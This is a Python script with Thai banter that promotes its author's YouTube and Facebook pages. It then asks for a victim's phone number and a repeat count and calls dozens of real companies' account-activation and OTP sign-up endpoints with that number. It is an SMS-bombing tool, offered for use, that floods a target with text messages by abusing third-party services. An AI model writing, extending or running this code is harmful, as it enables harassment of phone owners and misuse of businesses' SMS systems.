...
os.system("clear")
time.sleep (1)
print ("\t\x1b[91mกำลังโหลดครับอย่ารีบ.....")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mกดติดตามำอสาส!!!")
time.sleep (1)
print ("\x1b[96m[\x1b[91m1\x1b[96m] \x1b[96mกดติดตามก่อนใช่นะไอหนู \x1b[91m:V")
time.sleep (1)
os.system("xdg-open https://youtube.com/channel/UCwmhMExJ5V82NRYMUBR8Q6A")
time.sleep (8)
print ("\x1b[96m[\x1b[91m2\x1b[96m] \x1b[96mกดติดตามผมด้วยไอสาส\x1b[91m:)")
time.sleep (1)
print ("\x1b[91m")
os.system ("clear")
time.sleep (1)
...
print("")
print("\033[92mhttps://www.facebook.com/nattapon.singnaun")
print("")
print("")
print("\033[92mYouTube:TAFLUKEDIT")
print("list")
print("")
phone = input("\033[95m[+] Number : \033[0m")
num = int(input("\033[95m[+] How : \033[0m"))
os.system("clear")
print("\033[95m______________อยู่สื่อๆไอสัส______________")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("\033[92m ยิงอยู่ครับไอสัส")
...
def test37():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับไอสัส")
...
def test60():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับไอสัส")
